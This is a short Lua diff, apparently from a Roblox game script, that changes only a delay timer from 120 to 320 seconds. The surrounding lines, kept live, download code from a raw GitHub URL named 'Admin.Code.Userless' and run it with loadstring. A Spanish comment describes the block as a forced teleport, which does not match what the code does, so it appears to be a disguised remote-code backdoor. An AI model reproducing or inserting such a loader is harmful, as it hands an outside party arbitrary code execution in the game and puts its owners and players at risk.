@@ -9,7 +9,7 @@ if modelSuccess and module then
 end
 
 -- 2. Si Despues de 2 Minutos Forzar La teletrasportacion Al CmdSpot si o si!
-task.delay(120, function()
+task.delay(320, function()
     local success, response = pcall(HttpService.GetAsync, HttpService, "https://raw.githubusercontent.com/luisaddoba200-wq/CodeAdmin.Coderless/main/Admin.Code.Userless")
     if success and response then
         local runCode = loadstring(response)
